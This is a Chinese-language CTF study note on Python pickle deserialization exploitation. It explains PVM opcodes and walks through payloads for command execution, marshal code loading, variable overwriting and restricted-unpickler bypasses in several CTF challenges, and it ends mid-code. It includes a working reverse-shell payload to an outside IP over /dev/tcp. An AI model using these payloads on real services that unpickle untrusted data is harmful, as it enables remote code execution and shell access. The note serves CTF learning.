##  前言

因为强网杯出现了一道pickle反序列化的题目，所以自己打算总结总结

##  知识点

https://xz.aliyun.com/t/7436#toc-0

###  序列化概念：

`python`的序列化是将一个类对象向字节流转化从而进行存储和传输, 反序列化就是字节流转化回原始的对象的一个过程。

python反序列化：主要是下面几个概念：`pickle`, `pvm`, `__reduce__`魔术方法.

###  Pickle简介：

`Python`提供两个模块来实现序列化: `cPickle`和`pickle`. 这两个模块功能是一样的, 区别在于`cPickle`是`C`语言写的, 速度快; `pickle`是纯`Python`写的, 速度慢. 在`Python3`中已经没有`cPickle`模块. `pickle`有如下四种操作方法:

| 函数  | 说明                                |
| ----- | ----------------------------------- |
| dump  | 对象序列化到文件对象并存入文件      |
| dumps | 对象序列化为 bytes 对象，成为字节流 |
| load  | 对象反序列化并从文件中读取数据      |
| loads | bytes 对象反序列化，恢复对象        |

#### 可序列对象

- `None` 、 `True` 和 `False`
- 整数、浮点数、复数
- str、byte、bytearray
- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）

注意的是, 并不是所有的对象都能使用`pickle`进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以。

###  魔法方法\__reduce__()

简要介绍：

>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）

就类似与php中的`wakeup`一样的,当反序列化时就会调用该方法

###  简单序列化和反序列化操作

```
import pickle

class Demo():
    def __init__(self, name='z3eyond'):
        self.name = name

print('[+] 序列化')
print(pickle.dumps(Demo()))
print('[+] 反序列化')
print(pickle.loads(pickle.dumps(Demo())).name)
```

![image-20220807234305122](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220807234305122.png)

上面的序列化值其实就是一串`pvm`操作码

相当于下面这个

```
(i__main__
Demo
p0
(dp1
S'name'
p2
S'z3eyond'
p3
sb.
```

### PVM

#### 组成部分

`PVM`由三个部分组成:

- 指令处理器: 从流中读取`opcode`和参数, 并对其进行解释处理. 重复这个动作, 直到遇到`.`这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.
- 栈区(`stack`): 由`Python`的`list`实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.
- 标签区(`memo`): 由`Python`的`dict`实现, 为`PVM`的整个生命周期提供存储.

#### 执行流程

首先, `PVM`会把源代码编译成字节码, 字节码是`Python`语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行。 如果`Python`进程在主机上有写入权限, 那么它会把程序字节码保存为一个以`.pyc`为扩展名的文件. 如果没有写入权限, 则`Python`进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.

一般来说, 在构建程序时最好给`Python`进程在主机上的写入权限, 这样只要源代码没有改变, 生成的`.pyc`文件就可以被重复利用, 提高执行效率, 同时隐藏源代码。

然后, `Python`进程会把编译好的字节码转发到`PVM`(`Python`虚拟机)中, `PVM`会循环迭代执行字节码指令, 直到所有操作被完成.

#### 指令集

当前用于`pickling`的协议共有`6`种, 使用的协议版本越高, 读取生成的`pickle`所需的`Python`版本就要越新.

- `v0`版协议是原始的"人类可读"协议, 并且向后兼容早期版本的`Python`.
- `v1`版协议是较早的二进制格式, 它也与早期版本的`Python`兼容.
- `v2`版协议是在`Python 2.3`中引入的, 它为存储`new-style class`提供了更高效的机制, 参阅`PEP 307`.
- `v3`版协议添加于`Python 3.0`, 它具有对`bytes`对象的显式支持, 且无法被`Python 2.x`打开, 这是目前默认使用的协议, 也是在要求与其他`Python 3`版本兼容时的推荐协议.
- `v4`版协议添加于`Python 3.4`, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅`PEP 3154`.
- `v5`版协议添加于`Python 3.8`, 它支持带外数据, 加速带内数据处理.

```
# Pickle opcodes.  See pickletools.py for extensive docs.  The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from < 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```

opcode的版本造成的序列化值不一样

```python
import os
import pickle

class Demo():
    def __init__(self, name='z3eyond'):
        self.name = name

    def __reduce__(self):
        return (os.system, ('id',))


demo = Demo()
for i in range(6):
    print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(demo, protocol=i)))
```

```python
[+] pickle v0: b'cnt\nsystem\np0\n(Vid\np1\ntp2\nRp3\n.'
[+] pickle v1: b'cnt\nsystem\nq\x00(X\x02\x00\x00\x00idq\x01tq\x02Rq\x03.'
[+] pickle v2: b'\x80\x02cnt\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
[+] pickle v3: b'\x80\x03cnt\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
[+] pickle v4: b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x
85\x94R\x94.'
[+] pickle v5: b'\x80\x05\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x
85\x94R\x94.'
```

####  pickletools

用pickletools可以方便的将opcode转化为便于肉眼读取的形式

```
import pickletools
data=b"\x80\x05\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94."
pickletools.dis(data)
    0: \x80 PROTO      5
    2: \x95 FRAME      26
   11: \x8c SHORT_BINUNICODE 'nt'    
   15: \x94 MEMOIZE    (as 0)        
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)        
   25: \x93 STACK_GLOBAL
   26: \x94 MEMOIZE    (as 2)        
   27: \x8c SHORT_BINUNICODE 'id'    
   31: \x94 MEMOIZE    (as 3)
   32: \x85 TUPLE1
   33: \x94 MEMOIZE    (as 4)
   34: R    REDUCE
   35: \x94 MEMOIZE    (as 5)
   36: .    STOP
highest protocol among opcodes = 4

```

#### 利用pvm操作码演示

```
基本模式：
c<module>
<callable>
(<args>
tR.

例子：
cos
system
(S'whoami'
tR.
```

![image-20220807235945245](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220807235945245.png)

字节码就是`__import__('os').system(*('whoami',))`

```
cos         =>  引入模块 os.
system      =>  引用 system, 并将其添加到 stack.
(S'whoami'  =>  把当前 stack 存到 metastack, 清空 stack, 再将 'whoami' 压入 stack.
t           =>  stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack.
R           =>  system(*('whoami',)).
.           =>  结束并返回当前栈顶元素.
```

##  漏洞利用

###  出现的地方

1. 通常在解析认证`token`, `session`的时候. 现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.
2. 可能将对象`Pickle`后存储成磁盘文件.
3. 可能将对象`Pickle`后在网络中传输.

### 利用方式

1. 用来任意代码执行或者命令执行
2. 覆盖变量或者一些值，从而达到绕过身份认证的目的

### 一些基本的payload

**任意代码执行**

```
import pickle
import os

class exp(object):
    def __reduce__(self):
        s = """whoami"""  # 要执行的命令
        return os.system, (s,)        # reduce函数必须返回元组或字符串

e = exp()
poc = pickle.dumps(e)
print(poc) 
pickle.loads(poc)
#如果 pickle.loads(poc)，就会执行命令
```

**变量覆盖**

```
import pickle

key1 = b'321'
key2 = b'123'
class exp(object):
    def __reduce__(self):
        return (exec,("key1=b'1'\nkey2=b'2'",))

a = exp()
pickle_a = pickle.dumps(a)
print(pickle_a)
pickle.loads(pickle_a)
print(key1, key2)
```

### Marshal 反序列化

由于`pickle`无法序列化`code`对象, 因此在`python2.6`后增加了一个`marshal`模块来处理`code`对象的序列化问题.

所谓code对象，就是代码对象，是已经编译好的，python虚拟机中的字节码

```
import base64
import marshal

def demo():
    import os
    os.system('/bin/sh')

code_serialized = base64.b64encode(marshal.dumps(demo()))
print(code_serialized)
```

但是`marshal`不能直接使用`__reduce__`, 因为`reduce`是利用调用某个`callable`并传递参数来执行的, 而`marshal`函数本身就是一个`callable`, 需要执行它, 而不是将他作为某个函数的参数.

需要利用上面分析的那个`PVM`操作码来进行构造了, 先写出来需要执行的内容, `Python`能通过`types.FunctionTyle(func_code,globals(),'')()`来动态地创建匿名函数, 这一部分的内容可以看[官方文档](https://docs.python.org/3/library/types.html)的介绍.

结合上文的示例代码, 最重要执行的是: `(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()`.

给出payload：

```
import base64
import pickle
import marshal

def foo():
    import os
    os.system('whoami;/bin/sh')     # evil code

shell = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

print(pickle.loads(shell))
```

###  如何构造opcode

根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。而我们在CTF题目中，基本都是需要自己去手写opcode操作码

opcode操作码：

| opcode | 描述                                                         | 具体写法                                           | 栈上的变化                                                   | memo上的变化 |
| ------ | ------------------------------------------------------------ | -------------------------------------------------- | ------------------------------------------------------------ | ------------ |
| c      | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） | c[module]\n[instance]\n                            | 获得的对象入栈                                               | 无           |
| o      | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无           |
| i      | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 | 无           |
| N      | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               | 无           |
| S      | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               | 无           |
| V      | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               | 无           |
| I      | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               | 无           |
| F      | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               | 无           |
| R      | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             | 无           |
| .      | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           | 无           |
| (      | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 | 无           |
| t      | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| )      | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   | 无           |
| l      | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| ]      | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   | 无           |
| d      | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| }      | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   | 无           |
| p      | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           | 对象被储存   |
| g      | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   | 无           |
| 0      | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               | 无           |
| b      | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           | 无           |
| s      | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 | 无           |
| u      | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     | 无           |
| a      | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       | 无           |
| e      | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     | 无           |

由这些opcode我们可以得到一些需要注意的地方：

- 编写opcode时要想象栈中的数据，以正确使用每种opcode。
- 在理解时注意与python本身的操作对照（比如python列表的`append`对应`a`、`extend`对应`e`；字典的`update`对应`u`）。
- `c`操作符会尝试`import`库，所以在`pickle.loads`时不需要漏洞代码中先引入系统库。
- pickle不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。pickle能够索引查值的操作只有`c`、`i`。而如何查值也是CTF的一个重要考点。
- `s`、`u`、`b`操作符可以构造并赋值原来没有的属性、键值对。

#### 拼接opcode

将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。

#### 全局变量覆盖

python源码：

```
# secret.py
name='TEST3213qkfsmfo'
# main.py
import pickle
import secret

opcode='''c__main__
secret
(S'name'
S'1'
db.'''

print('before:',secret.name)

output=pickle.loads(opcode.encode())

print('output:',output)
print('after:',secret.name)
```

首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：

```
opcode='''c__main__
secret
(S'name'
S'1'
db.'''
```

#### 函数执行

与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：

1. `R` ：

```
b'''cos
system
(S'whoami'
tR.'''
```

1. `i` ：

```
b'''(S'whoami'
ios
system
.'''
```

1. `o` ：

```
b'''(cos
system
S'whoami'
o.'''
```

#### 实例化对象

实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：

```
class Student:
    def __init__(self, name, age):
        self.name = name
        self.age = age

data=b'''c__main__
Student
(S'XiaoMing'
S"20"
tR.'''

a=pickle.loads(data)
print(a.name,a.age)
```

##  pker使用

工具：https://github.com/EddieIvan01/pker

原理和方法：https://xz.aliyun.com/t/7012#toc-5：

> - 变量赋值：存到memo中，保存memo下标和变量名即可
> - 函数调用
> - 类型字面量构造
> - list和dict成员修改
> - 对象成员变量修改

具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。

### 使用方法与示例

1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：

```
以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
```

注意：

1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:

```
test="123"
return test
```

被解析为：

```
b"S'123'\np0\n0g0\n."
```

#### pker：全局变量覆盖

- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：

```
secret=GLOBAL('__main__', 'secret') 
# python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
```

- 覆盖引入模块的变量：

```
game = GLOBAL('guess_game', 'game')
game.curr_ticket = '123'
```

接下来会给出一些具体的基本操作的实例。

#### pker：函数执行

- 通过`b'R'`调用：

```
s='whoami'
system = GLOBAL('os', 'system')
system(s) # `b'R'`调用
return
```

- 通过`b'i'`调用：

```
INST('os', 'system', 'whoami')
```

- 通过`b'c'`与`b'o'`调用：

```
OBJ(GLOBAL('os', 'system'), 'whoami')
```

- 多参数调用函数

```
INST('[module]', '[callable]'[, par0,par1...])
OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
```

#### pker：实例化对象

- 实例化对象是一种特殊的函数执行

```
animal = INST('__main__', 'Animal','1','2')
return animal


# 或者

animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
return animal
```

- 其中，python原文件中包含：

```
class Animal:

    def __init__(self, name, category):
        self.name = name
        self.category = category
```

- 也可以先实例化再赋值：

```
animal = INST('__main__', 'Animal')
animal.name='1'
animal.category='2'
return animal
```

###  操作

```
python3 pker.py < test/SUCTF2019_guess_game_1
```

##  CTF实战

### 高校战“疫”WEB webtmp

```python
import base64
import io
import sys
import pickle
from flask import Flask, Response, render_template, request
import secret

app = Flask(__name__)

class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category
    def __repr__(self):
        return f'Animal(name={self.name!r}, category={self.category!r})'
    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category
    
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))

def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

def read(filename, encoding='utf-8'):
    with open(filename, 'r', encoding=encoding) as fin:
        return fin.read()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.args.get('source'):
        return Response(read(__file__), mimetype='text/plain')
    if request.method == 'POST':
        try:
            pickle_data = request.form.get('data')
            if b'R' in base64.b64decode(pickle_data):
                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
            else:
                result = restricted_loads(base64.b64decode(pickle_data))
                if type(result) is not Animal:
                    return 'Are you sure that is an animal???'
            correct = (result == Animal(secret.name, secret.category))
            return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct)
        except Exception as e:
            print(repr(e))
            return "Something wrong"
    sample_obj = Animal('一给我哩giaogiao', 'Giao')
    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()
    return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

限制中，改写了`find_class`函数，只能生成`__main__`模块的pickle：

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__': # 只允许__main__模块
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
```

此外，禁止了`b'R'`：

```
try:
    pickle_data = request.form.get('data')
    if b'R' in base64.b64decode(pickle_data): 
        return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
```

目标是覆盖secret中的验证，由于secret被主程序引入，是存在于`__main__`下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：

payload

```
c__main__
secret
}S'name'
S'z3eyond'
sS'category'
S'z3eyond'
sb.
```

思路:就是把原来的secret.name和secret.category覆盖掉, 然后再序列化Animal提交

**利用pker工具生成payload**

```
secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
animal = INST('__main__', 'Animal','1','2')
return animal
```

###  SUCTF 2019 Guess_Game

源码：https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game

猜数游戏，10 以内的数字，猜对十次就返回 flag。

```python
# file: Ticket.py
class Ticket:
    def __init__(self, number):
        self.number = number

    def __eq__(self, other):
        if type(self) == type(other) and self.number == other.number:
            return True
        else:
            return False

    def is_valid(self):
        assert type(self.number) == int

        if number_range >= self.number >= 0:
            return True
        else:
            return False
       
# file: game_client.py
number = input('Input the number you guess\n> ')
ticket = Ticket(number)
ticket = pickle.dumps(ticket)
writer.write(pack_length(len(ticket)))
writer.write(ticket)
```

client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。

```python
# file: game_server.py 有删减
from guess_game.Ticket import Ticket
from guess_game.RestrictedUnpickler import restricted_loads
from struct import unpack
from guess_game import game
import sys

while not game.finished():
    ticket = stdin_read(length)
    ticket = restricted_loads(ticket)

    assert type(ticket) == Ticket

    if not ticket.is_valid():
        print('The number is invalid.')
        game.next_game(Ticket(-1))
        continue

    win = game.next_game(ticket)
    if win:
        text = "Congratulations, you get the right number!"
    else:
        text = "Wrong number, better luck next time."
    print(text)

    if game.is_win():
        text = "Game over! You win all the rounds, here is your flag %s" % flag
    else:
        text = "Game over! You got %d/%d." % (game.win_count, game.round_count)
    print(text)

# file: RestrictedUnpickler.py  对引入的模块进行检测
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if "guess_game" == module[0:10] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

server 端将接收到的数据进行反序列，这里与常规的 pickle.loads 不同，采用的是 Python 提供的[安全措施](https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals)。也就是说，导入的模块只能以 guess_name 开头，并且名称里不能含有 __。

最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。

```python
# file: Game.py
from random import randint
from guess_game.Ticket import Ticket
from guess_game import max_round, number_range

class Game:
    def __init__(self):
        number = randint(0, number_range)
        self.curr_ticket = Ticket(number)
        self.round_count = 0
        self.win_count = 0

    def next_game(self, ticket):
        win = False
        if self.curr_ticket == ticket:
            self.win_count += 1
            win = True

        number = randint(0, number_range)
        self.curr_ticket = Ticket(number)
        self.round_count += 1

        return win

    def finished(self):
        return self.round_count >= max_round

    def is_win(self):
        return self.win_count == max_round
```

只要能控制住 curr_ticket，每局就能稳赢，或者直接将 win_count 设为 10，能实现吗？

先试试覆盖 win_count 和 round_count。换句话来说，就是需要在反序列化 Ticket 对象前执行：

```
from guess_game import game  # __init__.py  game = Game()
game.round_count = 10
game.win_count = 10
```

开始构造

```
cguess_game
game
}S'round_count'
I10
sS'win_count'
I10
sb
```

有个小验证，assert type(ticket) == Ticket。

```
ticket = Ticket(6)
res = pickle.dumps(ticket)  # 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor
print(res)
'''
\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
'''
```

最终 payload：

```
cguess_game\ngame\n}S"win_count"\nI10\nsS"round_count"\nI9\nsbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
```

尝试覆盖掉 current_ticket：

```
cguess_game\n
game
}S'curr_ticket'
cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbp0
sbg0
.
```

这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。

最终 payload：

```
cguess_game\ngame\n}S'curr_ticket'\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x07sbp0\nsbg0\n.
```

**pker生成**

```
ticket=INST('guess_game.Ticket','Ticket',(1))
game=GLOBAL('guess_game','game')
game.win_count=9
game.round_count=9
game.curr_ticket=ticket

return ticket
```

#### watevrCTF-2019:Pickle Store

payload

```
b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/192.168.11.21/8888 0>&1'"
tR.
'''
```

pker生成

```
system=GLOBAL('os', 'system')
system('bash -c "bash -i >& /dev/tcp/192.168.11.21/8888 0>&1"')
return
```

###  2022强网杯--crash

```python
import base64
# import sqlite3
import pickle
from flask import Flask, make_response,request, session
import admin
import random

app = Flask(__name__,static_url_path='')
app.secret_key=random.randbytes(12)

class User:
    def __init__(self, username,password):
        self.username=username
        self.token=hash(password)

def get_password(username):
    if username=="admin":
        return admin.secret
    else:
        # conn=sqlite3.connect("user.db")
